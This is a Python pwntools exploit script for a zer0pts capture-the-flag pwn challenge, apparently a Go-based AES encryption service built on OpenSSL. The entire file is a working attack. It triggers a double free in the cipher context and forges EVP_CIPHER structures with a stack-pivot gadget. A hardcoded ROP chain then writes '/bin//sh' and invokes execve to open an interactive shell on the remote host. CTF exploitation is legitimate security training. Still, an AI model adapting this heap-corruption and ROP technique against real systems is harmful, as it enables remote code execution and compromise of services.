#!/usr/bin/env python3

from pwn import *
from ctypes import *
import sys
from Cryptodome.Cipher import AES 
from Cryptodome.Util.Padding import pad, unpad
# from Cryptodome.Util.py3compat import *

address = 'pwn.ctf.zer0pts.com'
port = 9003
binary = './chall'

p = remote(address, port)

def s(a): return p.send(a)
def sa(a,b): return p.sendafter(a,b)
def sl(a): return p.sendline(a)
def sla(a,b): return p.sendlineafter(a, b)

def r(a): return p.recv(a)
def rl(): return p.recvline()
def ru(a): return p.recvuntil(a)

def ur(a): return p.unrecv(a)

def ia(): return p.interactive()

def uint32(n):
    return n & 0xFFFFFFFF

def uint64(n):
    return n & 0xFFFFFFFFFFFFFFFF

def set_key(key):
    sl('1')
    ru(': ')
    sl(key)
    ru('> ')

def set_iv(iv):
    sl('2')
    ru(': ')
    sl(iv)
    ru('> ')

def set_data(data):
    sl('3')
    ru(': ')
    sl(data)
    ru('> ')

def encrypt(panic=False):
    sl('4')
    if panic:
        ru('> ')
        return
    ru(': ')
    plain_text = rl()[:-1][1:-1].split(b' ')
    ru(': ')
    encrypted = rl()[:-1][1:-1].split(b' ')
    ru('> ')
    return (plain_text, encrypted)

def encrypt_fatal():
    sl('4')
    ru('pc=')
    pc = rl()[:-2]
    r(4096)
    return pc

class AESCryptoCBC():
    def __init__(self, key, iv):        
        self.crypto = AES.new(key, AES.MODE_CBC, iv)

    def encrypt(self, data):        
        enc = self.crypto.encrypt(data, AES.block_size)
        return enc

    def decrypt(self, enc):        
        dec = self.crypto.decrypt(enc)
        return dec

# EVP_CIPHER_CTX_new -> zalloc(0xa8)
# EVP_CipherInit_ex -> ctx->cipher_data = OPENSSL_zalloc(ctx->cipher->ctx_size); -> zalloc(0x108)
# EVP_CIPHER_CTX_reset -> free(ctx->cipher_data)  
nid = 0x1a3
block_size = 0x10
key_size = 0x10
iv_size = 0x10
do_cipher = 0x00450d33
cleanup = 0x0
cipher_data = 0x0
flags = 0x0 # 0x0
init = 0x0

key = p32(nid) + p32(block_size) + p32(key_size) + p32(iv_size)
iv = p32(nid) + p32(block_size) + p32(key_size) + p32(iv_size)
aes = AESCryptoCBC(key, iv)
ru('> ')
set_key('')
set_iv('')
set_data('41' * (0xa8 - 0x10)) # a = malloc(0xa8)
for i in range(1):
    encrypt(panic=True) # free(a) free(a) -> double free

# obuf's addr == ctx's addr
# 0x00450d33: mov rsp, qword [rax+0x38] ; mov qword [rax+0x38], 0x0000000000000000 ; ret  ;
# 0xc0000ce800 -> NO ASLR! (GOLANG....)
fake_evp_cipher_st_addr = 0xc0000b8800 - 0x1000 * 34
pivot_rsp = fake_evp_cipher_st_addr  + 0x80

rop = b''
rop += p64(0x0000000000499bab) # pop rsi ; ret
rop += p64(0x0000000000a7c120) # @ .data
rop += p64(0x0000000000404079) # pop rax ; ret
rop += b'/bin//sh'
rop += p64(0x000000000049feb4) # mov qword ptr [rsi], rax ; ret
rop += p64(0x0000000000499bab) # pop rsi ; ret
rop += p64(0x0000000000a7c128) # @ .data + 8
rop += p64(0x0000000000671f90) # xor rax, rax ; ret
rop += p64(0x000000000049feb4) # mov qword ptr [rsi], rax ; ret
rop += p64(0x00000000004011e6) # pop rdi ; ret
rop += p64(0x0000000000a7c120) # @ .data
rop += p64(0x0000000000499bab) # pop rsi ; ret
rop += p64(0x0000000000a7c128) # @ .data + 8
rop += p64(0x00000000004e0126) # pop rdx ; ret
rop += p64(0x0000000000a7c128) # @ .data + 8
rop += p64(0x0000000000671f90) # xor rax, rax ; ret
rop += p64(0x00000000004f4e0f) # add eax, 0x38 ; ret
rop += p64(0x00000000006caad0) # add rax, 1 ; ret
rop += p64(0x00000000006caad0) # add rax, 1 ; ret
rop += p64(0x00000000006caad0) # add rax, 1 ; ret
rop += p64(0x0000000000427a74) # syscall
fake_evp_cipher_st = p32(nid) + p32(block_size)  + p32(key_size) + p32(iv_size) + p64(flags) + p64(init) + p64(do_cipher) + p64(cleanup) + p64(0x0) *1 + p64(pivot_rsp) + p64(0) * 8 + rop + p64(0x0) * 27
set_key(enhex(fake_evp_cipher_st))
set_iv(enhex(fake_evp_cipher_st))

engine = 0xdeadbeef
encrypt = 0xdeadbeef
buf_len = 0x41414141
fake_evp_cipher_ctx_st = p64(fake_evp_cipher_st_addr)+ p64(engine) + p32(encrypt) + p32(buf_len) + p64(cipher_data)* 13
set_data(enhex(aes.decrypt(fake_evp_cipher_ctx_st)).ljust((0xa8-0x10)*2, '0'))
sl('4') 
ia()
